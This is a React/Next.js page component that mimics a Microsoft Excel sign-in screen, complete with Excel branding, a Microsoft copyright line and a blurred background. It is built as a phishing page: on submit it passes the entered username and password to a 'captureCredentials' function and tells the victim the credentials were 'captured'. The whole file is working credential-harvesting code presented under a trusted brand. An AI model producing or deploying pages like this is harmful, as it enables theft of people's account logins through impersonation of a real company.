'use client';
import { FormEvent, useState } from 'react';
import Image from 'next/image';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import { useToast } from '@/hooks/use-toast';
import { PlaceHolderImages } from '@/lib/placeholder-images';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

export default function Home() {
  const bgImage = PlaceHolderImages.find(
    (img) => img.id === 'login-background'
  );

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const { toast } = useToast();

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await captureCredentials({ username, password });
    toast({
      title: 'Signed In',
      description: 'Your credentials have been captured successfully.',
    });
    // Reset form
    setUsername('');
    setPassword('');
  };

  return (
    <div className="relative w-screen h-screen">
      {bgImage && (
        <div className="absolute inset-0 z-10">
          <Image
            src={bgImage.imageUrl}
            alt={bgImage.description}
            fill={true}
            objectFit="cover"
            className="filter blur-sm"
            data-ai-hint={bgImage.imageHint}
          />
        </div>
      )}

      <div className="absolute inset-0 z-20 flex items-center justify-center">
        <Card className="w-[380px] bg-white/95 text-center shadow-2xl">
          <CardHeader>
            <CardTitle className="text-2xl text-[#217346]">
              Sign in to Excel
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} autoComplete="off" className="space-y-4">
              <Input
                type="text"
                name="username"
                placeholder="Email or phone"
                required
                autoComplete="off"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full p-3 border-gray-300 rounded-md text-base"
              />
              <Input
                type="password"
                name="password"
                placeholder="Password"
                required
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 border-gray-300 rounded-md text-base"
              />
              <Button
                type="submit"
                className="w-full p-3 mt-2 bg-[#217346] text-white font-bold rounded-md hover:bg-green-800"
              >
                Sign in
              </Button>
            </form>
            <div className="mt-4 text-xs text-gray-600">
              © Microsoft Corporation
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
